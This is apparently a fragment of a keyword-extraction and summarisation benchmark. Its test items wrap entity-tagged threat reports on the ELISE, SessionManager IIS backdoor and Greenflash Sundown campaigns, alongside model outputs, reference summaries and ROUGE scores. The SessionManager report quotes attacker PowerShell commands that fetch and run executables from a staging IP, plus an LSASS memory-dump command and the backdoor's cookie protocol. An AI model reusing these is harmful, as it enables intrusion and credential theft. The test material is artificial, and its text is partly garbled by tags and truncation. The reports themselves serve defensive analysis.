A\\x00S\\x00D\\x00A\\x00S\\x00D\\x00A\\x00S\\x00D\\x00A\\x00S\\x00D\\x00S\\x00A\\x00D\\x00 \" ) } 058Share Share \u00ab Why [DATE] 2015 was the tipping point for cybersecurity | MainCommentsPost a commentComments are moderated and will not appear until the author has approved them . If you have a [ORG] TypeKey or [ORG] TypePad account , please Sign inName*Email*Website \u00a9 2012 [DATE] - [DATE] 2015 PwC. All rights reserved . PwC refers to the [ORG] PwC network and/or [CARDINAL] one or more of its member firms , each of which is a separate legal entity . Please see www.pwc.com/structure for further details . Privacy Statement | Cookies info | Legal Disclaimer | Provision of Services | Diversity", "generated_text": "espionage; Lazarus; a PowerPoint slideshow; Observations; cyber compensated dating; Taiwanese students; CVE-2014-4114; The malware; the initial lure; the malware; the background; the malware; the %TEMP% directory; the hlwyss.inf; the Metasploit; CVE-2014-4114; Metasploit; CVE-2015-3113; the Sandworm; Metasploit; a macro; data; the attacker; the malware; analysis; the malware.", "ref_text": "<START-1>Here is a summary of the key points from the PDF: The document analyzes a malicious PowerPoint file that was distributed via spear-phishing to target individuals in Taiwan. The PowerPoint file exploits the Sandworm vulnerability CVE-2014-4114 to drop malware onto the system. This malware, dubbed ELISE by the researchers, establishes persistence and connects to command and control servers to enable further exploitation. Analysis of the malware shows it is likely associated with a threat actor group called Lotus Blossom that has been actively targeting Taiwan for espionage objectives. ELISE shares code similarities with other Lotus Blossom malware. It runs commands to gather system info, upload/download files, and open a remote shell. To evade detection, the malware creates an obese 500MB file with junk padding that likely triggers antivirus engines. The malware campaign shows Lotus Blossom is still actively targeting Taiwan using spear-phishing documents exploiting known vulnerabilities to gain a foothold on systems. Recommendations include enabling the provided Yara rules and network detection signatures to identify ELISE malware and C2 traffic. The document provides an in-depth look into the technical tactics, techniques, and procedures used in this targeted attack campaign against Taiwan. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4472843450479233, "gpt3/lexical/rouge_rouge2": 0.1157556270096463, "gpt3/lexical/rouge_rougeL": 0.23003194888178913, "gpt3/lexical/rouge_rougeLsum": 0.23003194888178913, "gpt3_generated_text": ["This article analyzes a malware variant that targets individuals in Taiwan. The malware is disguised as a PowerPoint slideshow file titled \"Observations on cyber compensated dating among Taiwanese students.\" The initial lure of the malware is likely spear-phishing, and once the slideshow file is opened, the malware is dropped in the background. It creates two files in the %TEMP% directory and uses an embedded INF file for installation, which is consistent with the Metasploit implementation of CVE-2014-4114, also known as the \"Sandworm\" vulnerability. The malware also replicates itself and ensures persistence on future restarts. The analysis provides insight into the characteristics of the malware and suggests methods for detecting and defending against it."]}, {"split_name": "test", "sample_id": "test_72", "prompt_text": "Extract the keywords: securelist.com /the - sessionmanager - iis - backdoor/106868/ The SessionManager IIS backdoorPierre [PERSON] DelcherA possibly overlooked GELSEMIUM artefactFollowing on from our earlier [NORP] Owowa discovery , we continued to hunt for more backdoors potentially set up as malicious modules within [ORG] IIS , a popular web server edited by [ORG] Microsoft . And we did n\u2019t come back empty - handed \u2026 In [DATE] 2021 , we noticed a trend among several threat actors for deploying a backdoor within IIS after exploiting [CARDINAL] one of the [ORG] ProxyLogon - type vulnerabilities within [ORG] Microsoft [ORG] Exchange servers . Dropping an IIS module as a backdoor enables threat actors to maintain persistent , update - resistant and relatively stealthy access to the IT infrastructure of a targeted organization ; be it to collect emails , update further malicious access , or clandestinely manage compromised servers that can be leveraged as malicious infrastructure . In [DATE] early [DATE] 2022 , we investigated [CARDINAL] one such IIS backdoor : SessionManager . In [DATE] late [DATE] April [DATE] 2022 , most of the samples we identified were still not flagged as malicious in a popular online file scanning service , and [ORG] SessionManager was still deployed in [CARDINAL] over [CARDINAL] 20 organizations . SessionManager has been used against NGOs , government , military and industrial organizations in [LOC] Africa , [LOC] South [LOC] America , [LOC] Asia , [LOC] Europe , [GPE] Russia and [LOC] the [LOC] Middle [LOC] East , starting from [DATE] at [DATE] least [DATE] March [DATE] 2021.1/9Because of the similar victims , and use of a common [ORG] OwlProxy variant , we believe the malicious IIS module may have been leveraged by the [ORG] GELSEMIUM threat actor , as part of espionage operations . SessionManager : there \u2019s yet another unwanted module in your web serverDeveloped in [LANGUAGE] C++ , [ORG] SessionManager is a malicious native - code IIS module whose aim is to be loaded by some IIS applications , to process legitimate HTTP requests that are continuously sent to the server . Such malicious modules usually expect seemingly legitimate but specifically crafted HTTP requests from their operators , trigger actions based on the operators \u2019 hidden instructions if any , then transparently pass the request to the server for it to be processed just like any other request ( see Figure [CARDINAL] 1).As a result , such modules are not easily spotted by usual monitoring practices : they do not necessarily initiate suspicious communications to external servers , receive commands through HTTP requests to a server that is specifically exposed to such processes , and their files are often placed in overlooked locations that contain a lot of other legitimate files . Figure [CARDINAL] 1 . Malicious IIS module processing requestsSessionManager offers the following capabilities that , when combined , make it a lightweight persistent initial access backdoor : Reading , writing to and deleting arbitrary files on the compromised server . Executing arbitrary binaries from the compromised server , also known as \u201c remote command execution \u201d . Establishing connections to arbitrary network endpoints that can be reached by the compromised server , as well as reading and writing in such connections.2/9We identified several variants of the [ORG] SessionManager module , all including remains of their development environment ( [ORG] PDB paths ) and compilation dates that are consistent with observed activity timeframes . This demonstrates a continuous effort to update the backdoor : [CARDINAL] V0 : the compilation date of the oldest sample we identified ( MD5 5FFC31841EB3B77F41F0ACE61BECD8FD ) is from [DATE] March [DATE] 2021 . The sample contains a development path ( [ORG] PDB path ): \u201c C:\\Users\\GodLike\\Desktop\\t\\t4\\StripHeaders- master\\x64\\Release\\sessionmanagermodule.pdb \u201d . This indicates the [ORG] SessionManager developer might have used the public source code of the StripHeaders IIS module as a template to first design SessionManager . V1 : a later sample ( MD5 84B20E95D52F38BB4F6C998719660C35 ) has a compilation date from [DATE] April [DATE] 2021 , and a [ORG] PDB path set as \u201c C:\\Users\\GodLike\\Desktop\\t\\t4\\SessionManagerModule\\x64\\Release\\sessionmanagermodule.pdb \u201d . V2 : another sample ( MD5 4EE3FB2ABA3B82171E6409E253BDDDB5 ) has a compilation date from [DATE] August [DATE] 2021 , and a [ORG] PDB path which is identical to the previous [PRODUCT] V1 , except for the project folder name which is \u201c SessionManagerV2Module \u201d . V3 : finally , the last sample we could identify ( MD5 2410D0D7C20597D9B65F237F9C4CE6C9 ) is dated from [DATE] September [DATE] 2021 and has a project folder name set to \u201c SessionManagerV3Module\u201d . SessionManager command and control protocol detailsSessionManager hooks itself in the HTTP communications processing of the web server by checking HTTP data just before IIS answers to an HTTP request ( see Figure [CARDINAL] 2 ) . In this specific step of HTTP processing , SessionManager can check the whole content of the HTTP request from a client ( an operator ) , and modify the answer that is sent to the client by the server ( to include results from backdoor activities ) , as previously shown in Figure 1.Figure 2 . SessionManager registration within the web server upon loadingCommands are passed from an operator to [ORG] SessionManager using a specific HTTP cookie name . The answer from the backdoor to an operator will usually be inserted in the body of the server HTTP response . If the expected cookie name and value format are not found in an HTTP request from a client , the backdoor will do nothing , and processing will continue as if the malicious module did not exist . The specific HTTP cookie name that is checked by [ORG] SessionManager is \u201c SM_SESSIONID \u201d in variants before V2 ( excluded ) , and \u201c [PERSON] SM_SESSION \u201d after . Formatting the exact command names and arguments also depends on the backdoor variant : Before V2 ( excluded ) , most of the commands and associated parameters are all passed as a [ORG] value[1 ] of the required [ORG] SessionManager [ORG] HTTP cookie , such as for a file reading [ORG] command:3/91 [ORG] Cookie : SM_SESSIONID = ReadFile - afile.txt The remote execution and the file writing functionalities require additional command data to be passed within the HTTP request body . After V2 ( included ) , only the command name is passed as a value of the required [ORG] SessionManager [ORG] HTTP cookie . Command parameters are passed using names and values[2 ] of additional cookies , while some commands still require data to be passed within the HTTP body as well . For example , the HTTP cookies definition for a file - reading command looks like this:1 Cookie : [PERSON] SM_SESSION = GETFILE;FILEPATH = afile.txt;The results of executed commands are returned as body data within HTTP responses . Before V2 ( excluded ) , [ORG] SessionManager did not encrypt or obfuscate command and control data . Starting with [PERSON] V2 ( included ) , an additional \u201c SM_KEY \u201d cookie can be included in HTTP requests from operators : if so , its value will be used as an XOR key to encode results that are sent by [ORG] SessionManager . The comprehensive list of commands for the most recent variant of [ORG] SessionManager is presented below : Command name ( [PERSON] SM_SESSION cookie value)GETFILEPUTFILEDELETEFILEFILESIZECommand parameters [ORG] FILEPATH : path of file to be read . FILEPOS1 : offset at which to start reading , from file start . FILEPOS2 : maximum number of bytes to read . [ORG] FILEPATH : path of file to be written . FILEPOS1 : offset at which to start writing . FILEPOS2 : offset reference . Associated capabilityRead the content of a file on the compromised server and send it to the operator as an HTTP binary file named cool.rar . Write arbitrary content to a file on the compromised server . The data to be written in the specified file is passed within the HTTP request body . FILEMODE : requested file access type . [ORG] FILEPATH : path of file to be deleted . Delete a file on the compromised [ORG] FILEPATH : path of file to be measured.CMDNone.PINGNone.server . Get the size ( in bytes ) of the specified file . Run an arbitrary process on the compromised server . The process to run and its arguments are specified in the HTTP request body using the format : < executable path>\\t < arguments > . The standard output and error data from process execution are sent back as plain text to the operator in the HTTP response body . Check for SessionManager deployment . The \u201c Wokring OK \u201d ( sic.)4/9S5HOST : hostname to connect to ( exclusive with S5IP).S5PORT : offset at which to start writing . S5IP : IP address to connect to if no hostname is given ( exclusive with S5HOST).S5TIMEOUT : maximum delay in [TIME] seconds to allow for connection . S5ID : identifier of the socket to write to , as returned by S5CONNECT.S5ID : identifier of the socket to read from , as returned by S5CONNECT.S5CONNECTS5WRITES5READS5CLOSES5ID : identifier of the socket to close , as returned by [ORG] S5CONNECT.message will be sent to the operator in the HTTP response body . Connect from compromised host to a specified network endpoint , using a created [ORG] TCP socket . The integer identifier of the created and connected socket will be returned as the value of the [LOC] S5ID cookie variable in the HTTP response , and the status of the connection will be reported in the HTTP response body . Write data to the specified connected socket . The data to be written in the specified socket is passed within the HTTP request body . Read data from the specified connected socket . The read data is sent back within the HTTP response body . Terminate an existing socket connection . The status of the operation is returned as a message within the HTTP response body . Post - deployment activities by [ORG] SessionManager operatorsOnce deployed , [ORG] SessionManager is leveraged by operators to further profile the targeted environment , gather in - memory passwords and deploy additional tools . Notably , operators used [PERSON] Powershell [PERSON] WebClient functionality from a [ORG] SessionManager remote execution command to download from the server IP address [DATE] 202.182.123[.]185 , [DATE] between [DATE] March [DATE] and [DATE] April [DATE] 2021 , such as:123powershell \" ( New - Object [ORG] Net . WebClient).DownloadFile('hxxp://202.182.123[.]185 / Dll2.dll','C:\\Windows\\Temp\\win32.dll')\"powershell \" ( New - Object [ORG] Net . WebClient).DownloadFile('hxxp://202.182.123[.]185 / ssp.exe','C:\\Windows\\Temp\\win32.exe')\"C:\\Windows\\Temp\\win32.exe C:\\Windows\\Temp\\win32.dllAdditional tools that operators attempted to download and execute from [ORG] SessionManager include a [ORG] PowerSploit - based reflective loader for [PERSON] the [PERSON] Mimikatz [PERSON] DLL , [PERSON] Mimikatz [PERSON] SSP , [ORG] ProcDump , as well as a legitimate memory dump tool from [LOC] Avast ( MD5 36F2F67A21745438A1CC430F2951DFBC ) . The latter has been abused by [ORG] SessionManager operators to attempt to read the memory of the LSASS process , which would enable authentication secrets collection on the compromised server . Operators also tried to leverage the Windows built - in [ORG] Minidump capability to do the same thing . In order to avoid detection by security products ( which obviously failed in our case ) , [ORG] SessionManager operators sometimes attempted additional malicious execution by running launcher scripts through the5/9Windows services manager command line . Starting from [DATE] November [DATE] 2021 , operators tried to leverage custom [PERSON] PyInstaller - packed Python scripts to obfuscate command execution attempts . This kind of Python script source code would look as follows:12345678import os , sys , base64 , codecsfrom subprocess import [ORG] PIPE , Popendef cmdlet(c):cmdlet = c.split('(-)')p = Popen(cmdlet , stdin = [ORG] PIPE , stdout = [ORG] PIPE , stderr = [ORG] PIPE , shell = True)_out , _ err = p.communicate()return ( codecs.decode(_out , errors='backslashreplace ' ) , codecs.decode(_out , errors='backslashreplace'))print('\\n---------------------\\n'.join(cmdlet(sys.argv[1])))And as a result , command execution attempts through this tool were made as follows:1 C:\\Windows\\Temp\\vmmsi.exe cmd.exe(-)/c(-)\"winchecksec.exe -accepteula -ma lsass.exe seclog.dmp\"In [CARDINAL] one case in [DATE] December [DATE] 2021 , [ORG] SessionManager operators attempted to execute an additional tool that we unfortunately could not retrieve . This tool was set up to communicate with the [ORG] IP address [CARDINAL] 207.148.109[.]111 , which is most likely part of the operators \u2019 infrastructure . SessionManager targetsWe managed to identify [CARDINAL] 34 servers that were compromised by a [ORG] SessionManager variant , belonging to [CARDINAL] 24 distinct organizations in [GPE] Argentina , [GPE] Armenia , [GPE] China , [GPE] Djibouti , [GPE] Equatorial [GPE] Guinea , [GPE] Eswatini , [GPE] Hong [GPE] Kong , [GPE] Indonesia , [GPE] Kenya , [GPE] Kuwait , [GPE] Malaysia , [GPE] Nigeria , [GPE] Pakistan , [GPE] Poland , [GPE] the [GPE] Russian [GPE] Federation , [GPE] Saudi [GPE] Arabia , [GPE] Taiwan , [GPE] Thailand , [GPE] Turkey , [GPE] the [GPE] United [GPE] Kingdom and [GPE] Vietnam ( see Figure [CARDINAL] 3).Usually , we could only identify one compromised server per organization , and [CARDINAL] only [CARDINAL] one compromised organization per location ; but [GPE] Vietnam is the main exception as several compromised servers from several organizations could be identified there . Amongst the identified organizations , [CARDINAL] 20 were still running a compromised server as late as June 2022.Additionally , we managed to identify an earlier target of the same campaign that was not compromised with [ORG] SessionManager , in [GPE] Laos in mid - [DATE] March [DATE] 2021 ( see Attribution).Figure [CARDINAL] 3 . Map of organizations targeted by [ORG] SessionManager campaign ( darker color indicates a higher concentration ) ( download)Most of the compromised servers belong to government or military organizations , but we also identified international and national non - government organizations , an electronic equipment manufacturer , a6/9shipbuilding company , a health care and surgery group , a local road transportation company , a state oil company , a state electricity company , a sales kiosk manufacturer , and an [ORG] ERP software editor . [ORG] AttributionFirst , we identified an additional malicious binary ( MD5 5F15B17FA0E88D40D4E426E53CF94549 , compilation date set in [DATE] April [DATE] 2020 ) that shares a common [ORG] PDB path part with SessionManager samples ( \u201c C:\\Users\\GodLike\\Desktop\\t\\ \u201d ) . This binary is a password stealer designed to grab Windows users \u2019 passwords when they are changed . It is compiled from a [NORP] Chinese - documented public source code called Hook - PasswordChangeNotify . Unfortunately , we could not retrieve any additional details about this binary exploitation , but it may have been developed by the same developer as SessionManager . Then in mid - [DATE] March [DATE] 2021 , shortly before our first SessionManager detection , we noticed that a threat actor leveraged [ORG] ProxyLogon - type vulnerabilities against an [ORG] Exchange [ORG] Server in [GPE] Laos to deploy a web shell and conduct malicious activities using the same [PERSON] Mimikatz [PERSON] SSP and Avast memory dump tools that we described above ( see Post - deployment activities from [ORG] SessionManager operators ) . Not only were the tool samples the same , but [CARDINAL] one of them was downloaded from the staging server that [ORG] SessionManager operators leveraged ( 202.182.123[.]185 ) . As a result , we believe with medium to high confidence that those malicious activities were conducted by the same threat actor behind [ORG] SessionManager . Interestingly , the threat actor attempted to download and execute [CARDINAL] two samples of an HTTP server - type backdoor called [ORG] OwlProxy on the compromised server in [GPE] Laos . We then discovered that [CARDINAL] at [CARDINAL] least [CARDINAL] one of those [ORG] OwlProxy samples had also been downloaded from [DATE] 202.182.123[.]185 on [CARDINAL] at [CARDINAL] least [CARDINAL] two SessionManager - compromised servers in [DATE] late [DATE] March [DATE] 2021 . As a result , we believe with medium to high confidence that the threat actor who operates [ORG] SessionManager also used or tried to use those [ORG] OwlProxy samples before introducing SessionManager . The specific [ORG] OwlProxy variant of the samples we retrieved has only been documented as part of [ORG] GELSEMIUM \u2019s activities . We also noticed that [ORG] SessionManager targets ( see [ORG] SessionManager targets ) partly overlap with GELSEMIUM victims . As a result , we believe that [ORG] SessionManager might be operated by [ORG] GELSEMIUM , but not necessarily only [ORG] GELSEMIUM . Getting rid of IIS malicious modulesOnce again , the activities described here show that the [ORG] ProxyLogon - type vulnerabilities have been widely used since [DATE] March [DATE] 2021 to deploy relatively simple yet very effective persistent server accesses , such as the [PRODUCT] SessionManager backdoor . While some of the [ORG] ProxyLogon exploitation by advanced threat actors was documented right away , notably by [PERSON] Kaspersky , [ORG] SessionManager was poorly detected for [DATE] a [DATE] year . Facing massive and unprecedented server - side vulnerability exploitation , most cybersecurity actors were busy investigating and responding to the [ORDINAL] first identified offences . As a result , it is still possible to discover related malicious activities [DATE] months or [DATE] years [DATE] later , and that will probably be the case for a long time . In any case , we can not stress enough that IIS servers must undergo a complete and dedicated investigation process after the gigantic opportunity that [ORG] ProxyLogon - style vulnerabilities exposed , starting7/9 in [DATE] 2021 . Loaded IIS modules can be listed for a running IIS instance by using the IIS Manager [PERSON] GUI , or from the [ORG] IIS appcmd command line . If a malicious module is identified , we recommend the following template of actions ( merely deleting the malicious module file will not be enough to get rid of it):Take a volatile memory snapshot on the currently running system where [ORG] IIS is executed . Request assistance from forensics and incident response experts if required . Stop the IIS server , and ideally disconnect the underlying system from publicly reachable networks . Back up all files and logs from your IIS environment , to retain data for further incident response . Check that the backups can be opened or extracted successfully . Using IIS Manager or the appcmd command tool , remove every reference of the identified module from apps and server configurations . Manually review associated IIS XML configuration files to make sure any reference to the malicious modules have been removed \u2013 manually remove the references in XML files otherwise . Update the IIS server and underlying operating system to make sure no known vulnerabilities remain exposed to attackers . Restart the IIS server and bring the system online again . It is advised to then proceed with malicious module analysis and incident response activities ( from the memory snapshot and backups that have been prepared ) , in order to understand how the identified malicious tools have been leveraged by their operators . Indicators of CompromiseSessionManager F189D8EFA0A8E2BEE1AA1A6CA18F6C2BPyInstaller - packed process creation wrapper 65DE95969ADBEDB589E8DAFE903C5381OwlProxy variant samples 30CDA3DFF9123AD3B3885B4EA9AC11A8Possibly related password stealer % PROGRAMFILES%\\Microsoft\\Exchange [PERCENT] Server\\V15\\ClientAccess\\OWA\\Auth\\SessionManagerModule.dll [PERCENT] % [PERCENT] PROGRAMFILES%\\Microsoft\\Exchange8/9Server\\V15\\FrontEnd\\HttpProxy\\bin\\SessionManagerModule.dll [PERCENT] % [PERCENT] WINDIR%\\System32\\inetsrv\\SessionManagerModule.dll [PERCENT] % WINDIR%\\System32\\inetsrv\\SessionManager.dll C:\\Windows\\Temp\\ExchangeSetup\\Exch.ps1 C:\\Windows\\Temp\\Exch.exe C:\\Windows\\Temp\\vmmsi.exe C:\\Windows\\Temp\\safenet.exe [DATE] C:\\Windows\\Temp\\upgrade.exe C:\\Windows\\Temp\\exupgrade.exe [ORG] C:\\Windows\\Temp\\dvvm.exe C:\\Windows\\Temp\\vgauth.exe C:\\Windows\\Temp\\win32.exePDB Paths C:\\Users\\GodLike\\Desktop\\t\\t4\\StripHeaders - master\\x64\\Release\\sessionmanagermodule.pdb C:\\Users\\GodLike\\Desktop\\t\\t4\\SessionManagerModule\\x64\\Release\\sessionmanagermodule.pdb [PERSON] C:\\Users\\GodLike\\Desktop\\t\\t4\\SessionManagerV2Module\\x64\\Release\\sessionmanagermodule.pdb [PERSON] C:\\Users\\GodLike\\Desktop\\t\\t4\\SessionManagerV3Module\\x64\\Release\\sessionmanagermodule.pdb C:\\Users\\GodLike\\Desktop\\t\\t0\\Hook - PasswordChangeNotify- master\\HookPasswordChange\\x64\\Release\\HookPasswordChange.pdbIP addresses 202.182.123[.]185 ( Staging server , between 2021 - 03 and 04 at least ) [CARDINAL] 207.148.109[.]111 ( Unidentified infrastructure)[1 ] As per RFC:2109 ( title [CARDINAL] 4.1 ) and its successor [PERSON] RFC:2965 ( title [CARDINAL] 3.1 ) , values of HTTP cookies that contain characters such as filepath backslashes should be quoted . SessionManager does not care to comply with referenced RFCs , and does not unquote such values , so will fail to process a cookie value that contains filepaths including backslashes as sent by standard HTTP clients.[2 ] The previous cookie value limitations ( see footnote [CARDINAL] 1 ) still exist with V2 + . In addition , any cookie variable definition to be processed by [PRODUCT] SessionManager [PRODUCT] V2 + must be terminated with a \u2018 ; \u2019 character , even if there is only one cookie variable set.9/9", "generated_text": "the SessionManager; IIS; GELSEMIUM; 2021; over 20 organizations; NGOs; government; military; industrial organizations; Africa; South America; Asia; Europe; Russia; the Middle East; part; malicious infrastructure; messages; scripts; persistence; access; commands; arbitrary binaries; connections; network endpoints; network traffic; the module; the attackers; the response; persistence; a lightweight initial access backdoor; read; writing; network endpoints; connections; an arbitrary folder; the compromised server; their code; access; the persistence; execution; espionage; use; detection.", "ref_text": "<START-1>The document discusses a malicious IIS module called SessionManager that has been used to backdoor Microsoft Exchange servers after they were compromised via ProxyLogon vulnerabilities. SessionManager acts as a persistent and stealthy backdoor, allowing attackers to control compromised servers. The backdoor offers several capabilities that make it a lightweight persistent initial access backdoor, including reading, writing to, and deleting arbitrary files on the compromised server, executing arbitrary binaries from the compromised server, establishing connections to arbitrary network endpoints that can be reached by the compromised server, and reading and writing in such connections. SessionManager was developed in C++ and has evolved through several versions since March 2021. It intercepts HTTP requests to run commands, read/write files, execute processes, and make network connections back to its operators. The module has targeted government, military, NGOs, and companies primarily across Asia, Africa, the Middle East, and Eastern Europe. It is suspected to be operated by the threat actor group Gelsemium, who has links to espionage activities. SessionManager abuses normal HTTP cookie values to pass commands and exfiltrate data. Later versions encrypt this traffic. After deploying it, attackers have used SessionManager to download additional reconnaissance and credential theft tools. Commands are passed from an operator to SessionManager using a specific HTTP cookie name. The answer from the backdoor to an operator will usually be inserted in the body of the server HTTP response. The report details the IOCs of SessionManager and related tools, as well as recommendations for detecting and removing IIS module backdoors. It highlights that Exchange servers compromised since early 2021 require thorough investigation for stealthy threats like SessionManager. Overall, the report sheds light on an overlooked but dangerous IIS backdoor being used for long-term access to violate organizations globally. It serves as a reminder that major vulnerabilities like ProxyLogon have lingering consequences that may take months or years to fully uncover. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4721030042918456, "gpt3/lexical/rouge_rouge2": 0.17241379310344826, "gpt3/lexical/rouge_rougeL": 0.2188841201716738, "gpt3/lexical/rouge_rougeLsum": 0.2188841201716738, "gpt3_generated_text": ["In 2021, threat actors, possibly GELSEMIUM, deployed a malicious IIS module called SessionManager as part of espionage operations against over 20 organizations, including NGOs, government, military, and industrial organizations in Africa, South America, Asia, Europe, Russia, and the Middle East. The SessionManager backdoor is designed to maintain persistent and stealthy access to compromised servers, allowing the attackers to read, write, and delete files, execute arbitrary binaries, and establish connections to arbitrary network endpoints. The module processes legitimate HTTP requests and executes hidden instructions from the operators, making it difficult to detect through usual monitoring practices. The backdoor has been continuously updated, with multiple variants identified, indicating ongoing efforts by the attackers to maintain their access. The malicious IIS module's persistence and ability to execute commands and scripts make it a lightweight initial access backdoor, enabling the attackers to maintain control over the compromised servers and use them as part of their malicious infrastructure."]}, {"split_name": "test", "sample_id": "test_73", "prompt_text": "Extract the keywords: 2/11/2020ShadowGate Returns to Worldwide Operations With Evolved Green\ufb02ash Sundown Exploit Kit - TrendLabs Security Intelligence BlogTrend Micro About TrendLabs Security Intelligence BlogSearch : Home CategoriesHome \u00bb Exploits \u00bb ShadowGate Returns to Worldwide Operations With Evolved Green\ufb02ash Sundown Exploit KitShadowGate Returns to Worldwide Operations With Evolved Green\ufb02ash Sundown Exploit KitPosted on : [DATE] June 27 , [DATE] 2019 at [TIME] 7:16 [TIME] am [TIME] Posted in : [GPE] Exploits Author : [PERSON] Joseph [PERSON] C [PERSON] Chen ( Fraud Researcher)0After almost two years of sporadic restricted activity , the [ORG] ShadowGate campaign has started delivering cryptocurrency miners with a newly upgraded version of [FAC] the [FAC] Green\ufb02ash [FAC] Sundown exploit kit . The campaign has been spotted targeting global victims , after operating mainly in [LOC] Asia . Background of the Green\ufb02ash Sundown exploit kiturl\ufb02ash - sundown - exploit - kit/1/72/11/2020 ShadowGate Returns to Worldwide Operations With Evolved Green\ufb02ash Sundown Exploit Kit - TrendLabs Security [PERSON] Intelligence [PERSON] Blog The [ORG] ShadowGate ( also called WordsJS ) campaign was identi\ufb01ed in [DATE] 2015 . It delivered malware with exploit kits through the compromised ad servers of Revive / OpenX advertising software . After a takedown operation on [DATE] September [DATE] 2016 , the campaign tried to hide their activities . However , that same year they also developed their own exploit kit , which we named [PERSON] Green\ufb02ash [PERSON] Sundown , likely to avoid using exploit kit services from the underground market . At [DATE] the [DATE] end [DATE] of [DATE] 2016 , the campaign stopped their injection attacks on the compromised ad servers and restricted their activity to spreading ransomware via compromised [NORP] South [NORP] Korean websites . In [DATE] April [DATE] 2018 , [ORG] ShadowGate was spotted spreading cryptocurrency miners with [PERSON] Green\ufb02ash [PERSON] Sundown . However , the injection was limited to servers in [NORP] East [NORP] Asian countries and soon stopped . After a period of relatively restrained activities , we noticed [ORG] ShadowGate attacking through ad servers again [DATE] this [DATE] June . However , these attacks were not just targeting regional victims but global ones . Visitors to websites embedded with malicious advertisements ( from the compromised ad servers ) were redirected to [ORG] the [ORG] Green\ufb02ash [ORG] Sundown exploit kit and infected with a [PERSON] Monero cryptocurrency miner . This is the most notable activity we have seen from this group since [DATE] 2016 . Despite their low pro\ufb01le over [DATE] the [DATE] past [DATE] couple [DATE] of [DATE] years , it seems that they have been continuously developing and evolving their exploit kit . Below is a report on how the Green\ufb02ash Sundown exploit kit has changed since we discovered it in [DATE] 2016 , including details of their latest activity . [PERSON] Green\ufb02ash [PERSON] Sundown re\ufb01ned evasion and targeting techniques [ORG] ShadowGate is invested in the continuous development of their exploit kit . In [DATE] 2018 , [PERSON] Green\ufb02ash [PERSON] Sundown was spotted integrating the Flash exploit for CVE-2018 - 4878 prior to other exploit kits . [PERSON] Green\ufb02ash [PERSON] Sundown was then identi\ufb01ed using another [PERSON] Flash exploit for [ORG] CVE-2018 - 15982 [DATE] this [DATE] April . The continuous updates of the kit to include new exploits allows it to maintain its infection rate . Figure [CARDINAL] 1 . Attack \ufb02ow of [ORG] ShadowGate and [ORG] the [ORG] Green\ufb02ash [ORG] Sundown exploit kiturl\ufb02ash - sundown - exploit - kit/2/72/11/2020ShadowGate Returns to Worldwide Operations With Evolved Green\ufb02ash Sundown Exploit Kit - TrendLabs Security Intelligence BlogFigure 2 . Timeline of [ORG] ShadowGate Activity ( data from [ORG] Trend [ORG] Micro [ORG] Smart [ORG] Protection Network)Figure [CARDINAL] 3 . Country distribution of [ORG] ShadowGate Activity ( data from [ORG] Trend [ORG] Micro [ORG] Smart [ORG] Protection [DATE] Networkfrom [DATE] June 7 , [DATE] 2019 [DATE] to [DATE] June [DATE] 24 , 2019)During the latest attack of [ORG] ShadowGate that started [DATE] this [DATE] June , we found that they had another version of the payload . [DATE] Last [DATE] November , we saw that this exploit kit used the same encryption technique to protect their malware payload during the last infection stage . However , this time they used the encryption from the \ufb01rst few communications to encrypt all of their traf\ufb01c during infection.url\ufb02ash - sundown - exploit - kit/3/72/11/2020 ShadowGate Returns to Worldwide Operations With Evolved Green\ufb02ash Sundown Exploit Kit - TrendLabs Security [PERSON] Intelligence [PERSON] Blog The encryption technique is as follows : \ufb01rst , the victim generates a random number called a nonce to produce a unique secret key during each attack . The secret key will be encrypted by a public key and then securely sent to the exploit kit . The exploit kit \u2014 using a private key \u2014 can recover the secret key and use it to encrypt the malicious payload that will be delivered with the RC4 algorithm ( a cipher algorithm requiring a shared key for decryption ) . The payload will then be sent to the victim , who will decrypt it with the secret keys . This encryption technique is supposed to prevent security solutions from detecting their malicious payload as it is transferred to the victim . In theory , because the secret key only exists in memory and is not supposed to be transferred directly in plaintext , it is dif\ufb01cult for a threat analyst to \ufb01nd the secret key and decrypt the malicious payload . The use of public key encryption algorithm was also seen in the exploit kit [ORG] Underminer , which we discovered [DATE] last [DATE] year . However , we found that the hackers behind [FAC] the [FAC] Green\ufb02ash [FAC] Sundown exploit kit made a mistake with their encryption . They used the generated nonce not only for generating the secret key but also as a key of RC4 to encrypt victim \u2019s WebGL information before sending it to exploit kit server . The generated nonce was actually sent in plaintext during their communication , which makes it accessible and readable . With the nonce , it becomes possible to reproduce the secret key and decrypt the malicious payload of\ufb02ine . Figure [CARDINAL] 5 . [PERSON] The [PERSON] Green\ufb02ash [PERSON] Sundown exploit kit encrypts the secret key with [ORG] JSEncrypt library ( deobfuscated ) The latest version of [FAC] the [FAC] Green\ufb02ash [FAC] Sundown exploit kit also features an updated [ORG] PowerShell loader . Since [DATE] November [DATE] 2018 , we noticed the exploit kit started to use a [ORG] PowerShell loader , which makes it capable of \ufb01leless malware infection . The upgraded loader in this new version is now capable of collecting a pro\ufb01le of the victim \u2019s environment and sending the information to the exploit kit server . This allows its operators to be more precise in their targeting . If the victim \u2019s pro\ufb01le \ufb01ts their speci\ufb01cations , the malware will deliver its payload . Otherwise , the server will return an empty response . The upgrade also helps them avoid sandboxes or honeypots that can capture their malware . The information taken from the victim includes OS details , user name , video card , hard disk information , and antivirus products . Figure [CARDINAL] 6 . The [ORG] PowerShell loader sends victim \u2019s pro\ufb01le and loads a malware payload with \ufb01leless infection [ORG] Recommendations and Solutionsurl\ufb02ash - sundown - exploit - kit/4/72/11/2020 ShadowGate Returns to Worldwide Operations With Evolved Green\ufb02ash Sundown Exploit Kit - TrendLabs Security Intelligence Blog Cybercriminals are continuously updating their exploit tools and techniques to evade detection and \ufb01nd better targets . These criminals sometimes spend [DATE] years re\ufb01ning their attacks , as seen with [PERSON] Green\ufb02ash [PERSON] Sundown . To stay ahead of the curve , users should always keep their systems and applications updated to the latest version . The vulnerabilities targeted by these exploit kits usually have available \ufb01xes , so applying a solid patching and update strategy mitigates much of the risk . To further strengthen security , enterprises are also advised to enable a multilayered protection system that can actively block threats and malicious URLs from the gateway to the endpoint . A proactive , multilayered approach to security is key against threats that exploit vulnerabilities . [ORG] Trend [ORG] Micro [ORG] Deep [ORG] Security and [ORG] Trend [ORG] Micro \u2122 [ORG] Vulnerability [ORG] Protection also provide virtual patching that protects servers and endpoints from threats that abuse vulnerabilities in critical applications or websites . [ORG] Trend [ORG] Micro customers 